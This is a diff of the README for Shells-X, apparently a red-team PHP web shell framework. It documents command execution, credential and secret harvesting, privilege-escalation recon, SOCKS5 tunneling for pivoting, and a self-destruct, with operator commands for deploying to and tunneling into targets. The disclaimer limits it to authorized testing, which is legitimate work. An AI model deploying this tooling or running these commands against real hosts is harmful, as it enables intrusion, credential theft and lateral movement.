@@ -7,66 +7,176 @@
 [![Single File Deploy](https://img.shields.io/badge/Deploy-Single%20File-orange.svg)](https://github.com/vektor-x-com/Shells-X)
 [![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey.svg)](https://github.com/vektor-x-com/Shells-X)
 
-A modular, single-file web shell framework with a build generator. Source modules are developed separately — deployment is always one file. Every build gets a unique SHA256 fingerprint.
+A modular, single-file web shell framework with a build generator. Source modules are developed separately — deployment is always one file. Every build gets a unique SHA256 fingerprint and a unique randomized color palette.
+
+![Shells-X overview — sidebar with modules and Faraday export panel, PHP Console and OS Shell stacked as terminal streams](images/faraday_export_panel.jpg)
 
 > **Disclaimer:** This tool is intended for authorized penetration testing, red team operations, CTF competitions, and security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before use.
 
-## Features
+---
 
-- **PHP Console** — execute PHP code with error handling, configurable timeout, and fatal error recovery
-- **OS Shell** — auto-detected command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD and command history
-- **Multiplexed Tunnel (WebTun)** — built-in HTTP tunnel with SOCKS5 proxy and port forwarding. Multiplexes hundreds of channels over a single HTTP connection. Works on hardened cPanel environments (see [Tunnel & Pivoting](#tunnel--pivoting))
-- **Port Scanner** — parallel TCP/UDP scanner with async connect, banner grabbing, TLS cert inspection, and service fingerprinting. Runs server-side — no tunnel overhead
-- **File Browser** — navigate, download, upload, delete. Shows permissions, owner:group, symlink targets, R/W flags
-- **System Diagnostics** — 30+ recon checks for privilege escalation, network pivoting, and credential harvesting (see [Diagnostics](#diagnostics))
-- **Command History** — persistent history with re-run, export, and IndexedDB storage
-- **Auto-Randomized Themes** — every build gets a unique color palette by default, with 6 named presets and custom accent support
-- **Traffic Encryption** — AES-256-CBC encrypts all request/response payloads when password protection is enabled, key derived from login password
-- **Framework Detection** — auto-detects 15+ CMS/frameworks (WordPress, Laravel, Joomla, Drupal, Symfony, Magento, etc.) with version, DB credentials, debug mode, and admin paths
-- **Self-Destruct** — one-click button to permanently delete the shell file from the server, clear sessions, and wipe local data
+## What's in the box
+
+| | |
+|---|---|
+| **PHP Console** | Execute PHP with fatal-error recovery, configurable timeout, terminal-stream output, history navigation |
+| **OS Shell** | Auto-detected command execution (probes `system` / `exec` / `shell_exec` / `passthru` / `popen` / `proc_open`), persistent CWD, history |
+| **File Browser** | Navigate, download, upload, delete. Shows permissions, owner:group, symlink targets, R/W flags |
+| **Port Scanner** | Server-side parallel TCP/UDP scanner with banner grab, TLS cert inspection, service fingerprinting. Up to 512 concurrent connects |
+| **System Diagnostics** | 30+ pure-PHP recon checks for privesc, network pivoting, credential harvesting — works even when all exec is disabled |
+| **Framework Detection** | Auto-detects 15+ CMS/frameworks (WordPress, Laravel, Joomla, Drupal, Symfony, Magento, etc.) with version + DB creds + debug mode + admin paths |
+| **WebTun** | Multiplexed HTTP tunnel with SOCKS5 proxy and port forwarding — hundreds of channels over one HTTP connection |
+| **Faraday Export** | One-click recon export to [Faraday VM](https://github.com/infobyte/faraday) — hosts, services, hostnames, descriptions + credentials CSV |
+| **Self-Destruct** | One click → `unlink(__FILE__)` on the server, IndexedDB + sessionStorage wiped on the operator side |
+| **Traffic Encryption** | AES-256-CBC over all request/response payloads when `--password` is set, key derived from login password |
+| **Auto-Randomized Themes** | Every build gets a unique HSL-derived palette by default, or pick from 16 named presets |
+
+---
 
 ## Quick Start
 
 ```bash
-# Default build
-python generate.py
+# Default build — random theme, no password, no tunnel
+python3 generate.py
 
-# Password-protected with tunnel
+# Password-protected with tunnel embedded
 python3 webtun/webtun.py --generate -k tunnelpass
-python generate.py --tunnel webtun/webtun_servers/tunnel.php --password s3cret --minify
+python3 generate.py --tunnel webtun/webtun_servers/tunnel.php --password s3cret --minify
 
-# Minimal build
-python generate.py --exclude tunnel,diagnostics
+# Slim build — drop modules you don't need
+python3 generate.py --exclude tunnel,scanner,history
 
-# Named color theme
-python generate.py --theme ocean
+# Named color theme, custom accent, reproducible build
+python3 generate.py --theme synth --seed op-nighthawk
 
-# Custom accent color
-python generate.py --accent "#ff6600"
-
-# Verify integrity
-python generate.py --verify dist/shell_a3f8c1e2.php
+# Verify integrity of a deployed build
+python3 generate.py --verify dist/shell_a3f8c1e2.php
 ```
 
 Output lands in `dist/`. Deploy the single `.php` file to a web server.
 
-## Generator Options
+### Generator Options
 
 | Flag | Description |
 |------|-------------|
-| `--password SECRET` | SHA256 password protection (plaintext never stored) |
+| `--password SECRET` | SHA256 password gate (plaintext never stored) — also enables AES-256-CBC traffic encryption |
 | `--tunnel FILE` | Embed tunnel PHP (WebTun or Neo-reGeorg) |
-| `--seed STRING` | Operator seed for unique fingerprinting |
+| `--seed STRING` | Operator seed → deterministic fingerprint + palette |
 | `--minify` | Strip comments, collapse whitespace |
-| `--exclude MODULES` | Comma-separated: `tunnel`, `diagnostics`, `history` |
-| `--theme NAME` | Color theme: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar` |
-| `--accent COLOR` | Custom accent hex color (e.g. `"#ff6600"`) |
+| `--exclude MODULES` | Comma-separated: `tunnel`, `diagnostics`, `history`, `scanner`, `faraday` (core modules like `shell` cannot be excluded) |
+| `--theme NAME` | One of 16 presets — see [Theming](#theming) |
+| `--accent COLOR` | Custom accent hex (e.g. `"#ff6600"`), overrides theme accent |
 | `--output NAME` | Custom output filename |
 | `--verify FILE` | Check integrity of a generated shell |
+
+---
+
+## Authentication & Encrypted Transport
+
+When `--password` is set, the shell renders a login screen instead of the main UI. The login form captures the password hash into `sessionStorage`, then every subsequent `fetchJSON` call encrypts the FormData with AES-256-CBC and decrypts the response. File downloads and uploads bypass encryption.
+
+![Login screen — password prompt before the shell renders](images/login_page.jpg)
+
+- Password is stored as SHA256 hash, plaintext never embedded
+- Encryption key derives from `SHA256(password)` — no extra flag needed
+- New tab or cleared `sessionStorage` re-prompts for the passphrase
+- Requires Web Crypto API (HTTPS or localhost) and PHP OpenSSL extension
+
+Logout: `http[s]://SHELL_URL/?logout`.
+
+---
+
+## PHP Console + OS Shell
+
+Both consoles share the same terminal-stream UI — append-only output with separators between executions, syntax-highlighted command echo, Ctrl+L to clear, Ctrl+↑/↓ for history. The PHP console takes multi-line input (Shift+Enter for newlines, Enter to submit); the OS shell tracks the working directory across commands.
+
+![PHP Console + OS Shell — terminal-stream output with command echo, history, snippet buttons](images/console_page.jpg)
+
+Snippet buttons (`scandir`, `/etc/passwd`, `phpinfo`, `uname`) drop common one-liners into the PHP input. History is persisted to IndexedDB so Ctrl+↑ recalls commands from previous sessions, not just the current page load.
+
+---
+
+## File Browser
+
+Walk the filesystem, peek at permissions and ownership, upload files via multipart POST, delete with confirmation, follow symlinks.
+
+![File Browser — directory listing with permissions, owner:group, symlink targets, R/W flags](images/files_page.jpg)
+
+- Click a row to navigate into a directory
+- Inline R/W flags so you can spot writable paths at a glance
+- Numeric uid/gid shown when the container's `/etc/passwd` doesn't know the owner
+
+---
+
+## Port Scanner
+
+Server-side parallel scanner — no tunnel overhead, no SOCKS5. Direct `stream_socket_client()` from the web server to targets, batched via `stream_select` for true parallelism. Pause/resume/stop controls, results stored in IndexedDB, per-scan `↑ Faraday` button to export the results.
+
+![Port Scanner — parallel TCP/UDP scan with banner grab, TLS info, per-scan controls](images/scans_page.jpg)
+
+- TCP + UDP scanning with up to 512 concurrent connections
+- Banner grab + service fingerprinting (SSH, HTTP, MySQL, Redis, PostgreSQL, …)
+- TLS cert inspection (CN, issuer, validity, SANs, self-signed flag)
+- CIDR notation, IP ranges, port lists/ranges, presets (tcp-small/big/huge, udp-small/big)
+- Per-port-list hint boxes showing what each preset actually covers
+- Live progress with open / closed / filtered counters
+
+For network discovery, this scanner is faster and more accurate than running nmap through the SOCKS tunnel. For interactive tool access, use the tunnel with `-L` port forwards instead.
+
+---
+
+## System Diagnostics
+
+30+ pure-PHP recon checks. Everything is read from `/proc`, `stat()`, `fileperms()`, and filesystem reads — works even when all exec functions are disabled.
+
+| ![Diagnostics — PHP posture, identity, container detection](images/diagnostics_page_1.jpg) | ![Diagnostics — process list, network sockets, ARP table](images/diagnostics_page_2.jpg) |
+|---|---|
+| ![Diagnostics — SUID binaries with GTFOBins matching, sudo config](images/diagnostics_page_3.jpg) | ![Diagnostics — framework detection with DB credentials extracted](images/diagnostics_page_4.jpg) |
+
+![Diagnostics — binary directory writability, detected panels, build fingerprint, running processes with UID highlighting](images/diagnostics_page_5.jpg)
+
+### What it surfaces
+
+**System & Identity** — PHP config, disable_functions, open_basedir; UID/GID + supplementary groups; container detection (Docker / Podman / Kubernetes / LXC via cgroups, `/.dockerenv`, PID 1); `/etc/passwd` users with real shells; privileged group memberships (sudo, wheel, docker, lxd, adm, shadow, disk).
+
+**Network** — Listening TCP ports (IPv4+IPv6) with UID and process correlation, IPv4-mapped IPv6 detection, loopback-vs-network-reachable classification; ARP table (filters incomplete entries); routing table with gateway + mask + metric.
+
+**Privilege Escalation** — SUID/SGID binaries with GTFOBins lookup; Linux capabilities (decoded CapEff/CapBnd with dangerous-cap highlighting); cron jobs + writable-script detection across `/etc/crontab`, `cron.d`, user crontabs; sudoers + sudoers.d contents; Docker/Podman socket readability/writability; mount points with `nosuid` / `noexec` / `ro` flags; kernel info (version, arch, ASLR state); SELinux / AppArmor / Seccomp posture; `/etc/ld.so.preload`; NFS exports with `no_root_squash` detection; systemd timers + writable `ExecStart` targets.
+
+**Credentials & Files** — SSH keys (rsa/ed25519/ecdsa), authorized_keys, host keys; shadow, sudoers, bash/zsh history; `.env` files across web roots; `.my.cnf`, `debian.cnf`, `.pgpass`; framework config files (wp-config.php, database.yml, etc.); backup files (`.bak`, `.sql`, `.swp`); writable system paths.
+
+**PHP Execution Analysis** — 18 dangerous functions probed individually + FFI; useful extensions; indirect exec vectors when all direct exec is disabled (mail `-X`, error_log type 3, `fsockopen` reverse shells, FFI libc calls); available interpreters & tools (python, perl, ruby, gcc, nmap, curl, wget, socat, …); 19+ hosting panels (cPanel, Plesk, aaPanel, CloudPanel, DirectAdmin, HestiaCP, ISPConfig, …).
+
+**Framework Detection** — Auto-detects WordPress, Laravel, Joomla, Drupal, Symfony, CodeIgniter, Magento 1/2, PrestaShop, Nextcloud/OwnCloud, phpBB, MediaWiki, Moodle, CakePHP, Yii2 with version + extracted DB credentials + debug mode + admin path.
+
+---
+
+## Faraday Export
+
+One-click export of all collected recon into a [Faraday Vulnerability Manager](https://github.com/infobyte/faraday) workspace. Recon-only — no Vulnerability entities are emitted, the Vulnerability view stays clean for actual testing work.
+
+![Faraday export sidebar panel — workspace + operator tag, downloads JSON + credentials CSV](images/faraday_export_panel.jpg)
+
+Each export produces **two files**:
+
+1. **`shells-x-*.json`** — uploaded with `faraday-cli tool report <json> --plugin-id Faraday_JSON`. Contains hosts (with hostnames, MAC, OS), services (open ports with banner / version / TLS info), and rich host descriptions covering posture (kernel, capabilities, security modules), privesc surface (sudoers NOPASSWD, writable cron scripts, ld.so.preload, NFS no_root_squash, docker socket, writable systemd timers), backup files, mounts with flags, routing, and framework details.
+
+2. **`shells-x-*-credentials.csv`** — imported via the Faraday UI → Credentials view → "Import CSV" button. Contains every `KEY=value` from `.env` files, plus parsed credentials from `wp-config.php` / `.my.cnf` / `.pgpass` / `database.yml` / Magento `env.php`, plus framework-extracted `db_*` fields. The `endpoint` column preserves provenance: `<host IP> :: <source file path>`.
+
+> Why two files? Faraday's `faraday_json` plugin and the server-side `bulk_create` endpoint both silently drop credential arrays. The dedicated `POST /credential/import_csv` UI flow is the only programmatic path that actually persists Credentials.
+
+Export buttons:
+- **Per-scan** — `↑ Faraday` button on each scan card → just that scan's open ports
+- **Diagnostics only** — `↑ Faraday` button on the Diagnostics page → posture snapshot of the shell host
+- **All** — sidebar `↑ Faraday export` button → scans + diagnostics merged
+
+---
 
 ## Tunnel & Pivoting
 
 Shells-X includes **WebTun** — a multiplexed HTTP tunnel that creates a SOCKS5 proxy through the compromised host. Unlike traditional SOCKS5-over-HTTP tunnels (Neo-reGeorg, reGeorg), WebTun multiplexes all channels over a single HTTP connection with binary framing, encrypted transport, and real-time streaming. This eliminates the per-connection overhead that causes false positives/negatives in port scanning and fuzzing.
+
+![Tunnel info — WebTun setup, ports, SOCKS5 status](images/tunnel_page.jpg)
 
 ### Why WebTun over Neo-reGeorg?
 
@@ -77,33 +187,33 @@ Shells-X includes **WebTun** — a multiplexed HTTP tunnel that creates a SOCKS5
 | Upstream | 1 POST per write | Batched POSTs (multiple frames per request) |
 | PHP-FPM workers | 1 per active connection | 1 total for all channels |
 | Scanning accuracy | False positives/negatives from timeouts | Accurate open/closed/filtered states |
-| Fuzzing | ~5-50 req/s, unreliable results | ~200-500 req/s, clean results |
+| Fuzzing | ~5-50 req/s, unreliable | ~200-500 req/s, clean results |
 | Hardened hosts | Requires exec for some features | Only needs `stream_socket_client` + `stream_select` |
 | Encryption | Basic XOR | AES-256-CBC + HMAC-SHA256 |
 
 ### Setup
 
 ```bash
-# 1. Generate tunnel server with password (creates webtun_servers/tunnel.php)
+# 1. Generate tunnel server with password
 python3 webtun/webtun.py --generate -k mypassword
 
 # 2. Build shell with tunnel embedded
-python generate.py --tunnel webtun/webtun_servers/tunnel.php --password shellpass
+python3 generate.py --tunnel webtun/webtun_servers/tunnel.php --password shellpass
 
 # 3. Deploy shell.php to target, then connect from attacker machine
 python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword --socks 1080
 ```
 
-Requires `aiohttp` and `cryptography` on the attacker machine:
+Attacker-side deps (`aiohttp` + `cryptography`):
 ```bash
 cd webtun && python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt
 ```
 
 ### Port forwarding vs SOCKS5 — when to use which
 
-Port forwarding (`-L`) creates a direct TCP pipe — your tool connects to a local port, bytes flow straight through the tunnel to the target. No SOCKS handshake, no proxychains, no LD_PRELOAD hooking. The tool doesn't even know it's going through a tunnel. This is **always faster and more reliable** than SOCKS5 for targeted access.
+Port forwarding (`-L`) creates a direct TCP pipe — your tool connects to a local port, bytes flow straight through the tunnel to the target. No SOCKS handshake, no proxychains, no `LD_PRELOAD` hooking. The tool doesn't even know it's going through a tunnel. **Always faster and more reliable** than SOCKS5 for targeted access.
 
-SOCKS5 adds a per-connection negotiation layer (greeting → method → CONNECT → reply → data) and requires the tool to support SOCKS or be wrapped with proxychains. Use it only when you need dynamic destination routing (subnet scanning, browsing multiple hosts).
+SOCKS5 adds a per-connection negotiation layer and requires the tool to support SOCKS or be wrapped with proxychains. Use it only when you need dynamic destination routing (subnet scanning, browsing multiple hosts).
 
 | Use case | Best approach | Why |
 |----------|--------------|-----|
@@ -114,7 +224,7 @@ SOCKS5 adds a per-connection negotiation layer (greeting → method → CONNECT 
 | Browse multiple internal sites | SOCKS5 + browser | Dynamic destinations |
 | Tool doesn't support SOCKS | `-L` port forward | Works with literally everything |
 
-**In practice**: use `-L` for everything targeted, SOCKS5 only for discovery/dynamic work. You can combine both in one session:
+Combine both in one session:
 
 ```bash
 python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
@@ -124,12 +234,9 @@ python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
   -L 16379:cache:6379
 ```
 
-SOCKS5 for nmap subnet discovery, port forwards for everything you interact with.
-
 ### Port forwarding examples
 
 ```bash
-# Forward specific services
 python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
   -L 13306:10.0.0.5:3306 \
   -L 16379:10.0.0.5:6379 \
@@ -147,21 +254,20 @@ ssh -p 2222 user@127.0.0.1   # with -L 2222:10.0.0.1:22
 ### SOCKS5 proxy examples
 
 ```bash
-# Start with SOCKS5 enabled (default port 1080)
 python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword --socks 1080
 
-# Curl — use socks5h:// to resolve DNS through the tunnel
+# curl — use socks5h:// to resolve DNS through the tunnel
 curl --proxy socks5h://127.0.0.1:1080 http://internal-app/
 curl --proxy socks5h://127.0.0.1:1080 http://10.0.0.5:8080/api/health
 
-# Fuzzing through SOCKS5
+# fuzzing
 ffuf -u http://10.0.0.5/FUZZ -w wordlist.txt -x socks5://127.0.0.1:1080
 gobuster dir -u http://10.0.0.5 -w wordlist.txt --proxy socks5://127.0.0.1:1080
 
-# Browser
+# browser
 chromium --proxy-server="socks5://127.0.0.1:1080"
 
-# SSH through tunnel
+# ssh
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.0.0.5
 ```
 
@@ -175,16 +281,13 @@ nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.0/24 -p 80,443,3306,637
 
 # Service detection on specific host
 nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-1000 -sV
-
-# Full port scan
-nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-65535
 ```
 
 | Flag | Why |
 |------|-----|
 | `-sT` | TCP connect scan — only type that works through SOCKS |
 | `-Pn` | Skip host discovery — ICMP can't traverse SOCKS |
-| `-n` | No DNS resolution — nmap resolves locally, internal hostnames won't work. For hostname resolution through the tunnel, use curl with `socks5h://` instead |
+| `-n` | No DNS resolution — internal hostnames won't work. For hostname resolution through the tunnel, use curl with `socks5h://` instead |
 | `--proxies socks4://` | Nmap's required format. NOT `--proxy`, NOT `socks5://` |
 
 ### WebTun client options
@@ -200,175 +303,71 @@ nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-65535
 | `--no-verify-ssl` | Skip TLS certificate verification |
 | `-v` | Debug logging |
 
-### Built-in port scanner (no tunnel needed)
-
-The Scanner tab runs a parallel port scanner **server-side in PHP** — no tunnel overhead, no SOCKS5. Direct `stream_socket_client()` from the web server to targets. Supports:
-
-- TCP and UDP scanning with configurable concurrency (up to 512 parallel connections)
-- Banner grabbing + service fingerprinting (SSH, HTTP, MySQL, Redis, PostgreSQL, etc.)
-- TLS certificate inspection
-- CIDR notation, IP ranges, port ranges
-- Pause/resume/stop controls
-- Results stored in IndexedDB with export
-
-For network discovery, use the built-in scanner (faster, more accurate). For interactive tool access, use the tunnel with `-L` port forwards. For dynamic routing to unknown hosts, use the SOCKS5 proxy.
-
 ### Legacy: Neo-reGeorg
 
-Neo-reGeorg is still supported via the same `--tunnel` flag:
+Still supported via the same `--tunnel` flag:
 
 ```bash
 python3 neoreg.py -g -k mypassword
-python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass
+python3 generate.py --tunnel neoreg_servers/tunnel.php --password shellpass
 python3 neoreg.py -u https://target.com/shell.php -k mypassword --skip
 ```
 
-## Diagnostics
-
-The Diagnostics tab runs 30+ pure-PHP recon checks (no shell execution required). Everything is read from `/proc`, `stat()`, `fileperms()`, and filesystem reads — works even when all exec functions are disabled.
-
-### System & Identity
-
-| Check | What it shows |
-|-------|--------------|
-| PHP config | Version, disable_functions, open_basedir, allow_url_fopen |
-| Process identity | UID, GID, groups, supplementary group memberships |
-| Container detection | Docker, Podman, Kubernetes, LXC (via cgroups, /.dockerenv, PID 1) |
-| Login users | /etc/passwd users with real shells, UID highlighted |
-| Privileged groups | Members of sudo, wheel, docker, lxd, adm, shadow, disk |
-
-### Network
-
-| Check | What it shows |
-|-------|--------------|
-| Open ports | Listening TCP ports (IPv4+IPv6) with UID and process correlation |
-| ARP table | Neighboring hosts with MAC addresses |
-| Routing table | Routes with gateway, mask, metric |
-
-### Privilege Escalation
-
-| Check | What it finds | Why it matters |
-|-------|--------------|----------------|
-| **SUID/SGID binaries** | Setuid/setgid binaries with GTFOBins matching | Direct root escalation if exploitable binary found |
-| **Capabilities** | Decoded CapEff/CapBnd with dangerous cap highlighting | CAP_SETUID, CAP_SYS_ADMIN = instant privesc |
-| **Cron jobs** | /etc/crontab, cron.d, user crontabs + writable script detection | Writable cron script = code exec as that user |
-| **Sudo config** | /etc/sudoers + sudoers.d contents | NOPASSWD entries, runas rules |
-| **Docker socket** | /var/run/docker.sock access + docker group check | Writable socket = root equivalent |
-| **Mount points** | Filesystem flags: rw, nosuid, noexec | rw + no nosuid = can place/run SUID binaries |
-| **Kernel info** | Version, architecture, ASLR status | Kernel version for exploit matching, ASLR off = easier exploitation |
-| **Security modules** | SELinux (enforcing/permissive), AppArmor, Seccomp | Permissive/disabled = fewer restrictions on exploits |
-| **LD_PRELOAD** | /etc/ld.so.preload writability | Writable = inject shared library into any process |
-| **NFS exports** | /etc/exports with no_root_squash detection | no_root_squash = create SUID binaries via NFS |
-| **Systemd timers** | Timer + service files, writable ExecStart targets | Writable target script = code exec as service user |
-
-### Credentials & Files
-
-| Check | What it finds |
-|-------|--------------|
-| Sensitive files | SSH keys (rsa/ed25519/ecdsa), authorized_keys, host keys, shadow, sudoers, bash/zsh history |
-| Environment files | .env, .env.local, .env.production across web roots |
-| Credential files | .my.cnf, debian.cnf, .pgpass, wp-config.php, database.php/yml |
-| Backup files | .bak, .old, .sql, .sql.gz, .swp, .cfg in web roots |
-| Writable dirs | /tmp, /dev/shm, /var/tmp, web roots |
-| Binary dirs | Readability and writability of /bin, /usr/bin, etc. |
-
-### PHP Execution Analysis
-
-| Check | What it shows |
-|-------|--------------|
-| Dangerous functions | 18 exec functions + FFI class availability |
-| Extensions | FFI, sockets, pcntl, phar, openssl, etc. |
-| Indirect vectors | When all direct exec is disabled, shows: mail() -X file write, error_log() type 3 file write, fsockopen() reverse shells, FFI libc calls |
-| Interpreters & tools | Available python, perl, ruby, gcc, nmap, curl, wget, socat, etc. |
-| Hosting panels | Detects 19+ panels (cPanel, Plesk, aaPanel, CloudPanel, etc.) |
+---
 
 ## Theming
 
 Every build automatically gets a unique, randomized color palette — no two shells look the same by default. Colors are derived from a random hue using HSL color space, keeping semantic colors (green/red/yellow for success/error/warning) fixed for usability.
 
 ```bash
-# Auto-random (default) — unique palette each build
-python generate.py
-
-# Deterministic — same seed always produces the same palette
-python generate.py --seed "op-nighthawk"
-
-# Named preset
-python generate.py --theme crimson
-
-# Preset with accent override
-python generate.py --theme mono --accent "#00ff88"
+python3 generate.py                            # Random hue (default)
+python3 generate.py --seed "op-nighthawk"      # Deterministic — same seed = same palette
+python3 generate.py --theme synth              # Named preset
+python3 generate.py --theme mono --accent "#00ff88"   # Preset + accent override
 ```
 
-Available presets: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar`
+**Hue-derived presets** (HSL recipe): `cyber`, `matrix`, `amber`, `synth`, `arctic`, `sodium`, `viridian`, `rust`, `ultra`, `plasma`
 
-When `--password` is set, the login page also matches the chosen theme.
+**Legacy hand-crafted**: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar`
 
-## Traffic Encryption
-
-When `--password` is set, all request/response payloads are automatically encrypted with AES-256-CBC. The encryption key is derived from the login password (`SHA256(password)`).
-
-- The login form captures the password hash into `sessionStorage` before authenticating
-- All subsequent `fetchJSON` calls encrypt the FormData and decrypt the response
-- File downloads (GET requests) and file uploads bypass encryption
-- If `sessionStorage` is cleared (new tab), the shell prompts for the passphrase
-- Requires Web Crypto API (HTTPS or localhost) and PHP OpenSSL extension
-
-No extra flags needed — encryption activates automatically with `--password`.
+---
 
 ## Self-Destruct
 
-A button in the sidebar permanently destroys the shell:
+A red button at the bottom of the sidebar permanently destroys the shell:
 
 1. Sends `action=destruct` → PHP calls `unlink(__FILE__)` + `session_destroy()`
-2. JS clears IndexedDB (`shelldb`) and `sessionStorage`
+2. JS clears IndexedDB (`shelldb`), `sessionStorage`, operator-side localStorage prefixes (`faraday.*`, `webtun.*`)
 3. Page is replaced with a "Shell destroyed" message
 
-Double confirmation prompt prevents accidental use. Always present regardless of modules or auth.
+Double-confirmation prompt prevents accidental triggering. Always present regardless of which modules are excluded or whether auth is enabled.
 
-## Framework Detection
-
-The Diagnostics tab auto-detects CMS and frameworks on the target filesystem using signature files (pure PHP, no shell exec). For each detected framework, it extracts:
-
-- Version number
-- Config file path
-- Database credentials (host, name, user, password)
-- Debug mode status
-- Admin panel path
-- Plugin/theme counts (WordPress)
-
-Supported: WordPress, Laravel, Joomla, Drupal, Symfony, CodeIgniter, Magento 1/2, PrestaShop, Nextcloud/OwnCloud, phpBB, MediaWiki, Moodle, CakePHP, Yii2
+---
 
 ## Build Fingerprint
 
-Every shell embeds a unique `__BUILD` with hash, timestamp, language, version, and operator seed. Visible in Diagnostics > Build Info. Use `--verify` to check integrity.
+Every shell embeds a unique `__BUILD` constant with hash, timestamp, language, version, and operator seed. Visible in Diagnostics → Build Info. Use `--verify dist/shell_<hash>.php` to check integrity of a deployed build.
 
-## Password Protection
-
-```bash
-python generate.py --password "hunter2"
-```
-
-SHA256 hash embedded — plaintext never stored. Logout via `?logout`.
+---
 
 ## Development
 
-A Docker-based dev setup is included for rapid iteration:
+Docker-based dev setup for rapid iteration:
 
 ```bash
-# Start dev containers (PHP 8.2 + Apache, nginx/mysql/redis targets)
+# Start dev containers (PHP 8.2 + Apache, plus nginx / mysql / redis targets)
 docker compose -f dev/docker-compose.yml up -d
 
-# Build shell (output is volume-mounted — changes are instant)
-python generate.py --output dev.php --theme ocean
+# Build shell (output volume-mounted — changes are instant)
+python3 generate.py --output dev.php --theme ocean
 
-# Open http://localhost:8888/dev.php
+# http://localhost:8888/dev.php
 
 # Auto-rebuild on source changes
 cd dev && ./watch.sh --theme ocean
 ```
 
-Internal target services for testing scanner and tunnel:
+Internal target services for testing the scanner and tunnel:
 
 | Service | Hostname (from shell) | Port |
 |---------|----------------------|------|
@@ -376,55 +375,27 @@ Internal target services for testing scanner and tunnel:
 | MySQL 8.0 | `target-mysql` | 3306 |
 | Redis | `target-redis` | 6379 |
 
-## Project Structure
-
-```
-Shells-X/
-├── generate.py                  # Build tool (Python 3, zero deps)
-├── templates/php.tpl            # Single-file PHP template
-├── src/
-│   ├── config/defaults.json     # Module definitions
-│   ├── backend/php/
-│   │   ├── _order.json          # Assembly order
-│   │   ├── crypto.php           # AES-256-CBC request/response encryption
-│   │   ├── scanner.php          # Parallel TCP/UDP port scanner
-│   │   ├── filebrowser.php      # Directory listing
-│   │   ├── fileops.php          # Delete + upload
-│   │   ├── eval.php             # PHP code execution
-│   │   ├── shell.php            # OS command execution
-│   │   ├── diagnostics.php      # System recon + privesc checks
-│   │   └── destruct.php         # Self-destruct handler
-│   └── frontend/
-│       ├── css/shell.css        # Dark theme
-│       ├── html/layout.html     # Layout with module markers
-│       └── js/                  # core, crypto, db, console, shell, tunnel,
-│                                # scanner, diagnostics, history, filebrowser
-├── webtun/                      # Multiplexed HTTP tunnel
-│   ├── webtun.py                # Python client + server generator
-│   ├── templates/tunnel.php     # PHP server template
-│   ├── requirements.txt         # aiohttp, cryptography
-│   └── webtun_servers/          # Generated output (gitignored)
-├── dev/                         # Development environment
-│   ├── docker-compose.yml       # PHP + target services
-│   └── watch.sh                 # Auto-rebuild file watcher
-└── dist/                        # Generated shells (gitignored)
-```
+---
 
 ## Keyboard Shortcuts
 
 | Key | Context | Action |
 |-----|---------|--------|
-| `Ctrl+Enter` | PHP Console | Execute code |
-| `Enter` | OS Shell | Execute command |
-| `Arrow Up/Down` | OS Shell | Navigate history |
-| `Ctrl+L` | OS Shell | Clear output |
+| `Enter` | PHP Console / OS Shell | Execute |
+| `Shift+Enter` | PHP Console / OS Shell | Newline (multi-line input) |
+| `Ctrl+↑` / `Ctrl+↓` | PHP Console / OS Shell | Navigate history |
+| `Ctrl+L` | PHP Console / OS Shell | Clear output |
+
+---
 
 ## Requirements
 
-- **Generator:** Python 3.6+ (stdlib only)
-- **Runtime:** PHP 5.6+ (`stream_socket_client` needed for tunnel and scanner)
-- **Tunnel client:** Python 3.8+ with `aiohttp`, `cryptography`
-- **Browser:** Any modern browser with IndexedDB
+- **Generator** — Python 3.6+ (stdlib only)
+- **Runtime** — PHP 5.6+ (`stream_socket_client` + `stream_select` needed for tunnel and scanner)
+- **Tunnel client** — Python 3.8+ with `aiohttp`, `cryptography`
+- **Browser** — Any modern browser with IndexedDB + Web Crypto API (for encrypted mode)
+
+---
 
 ## License
 
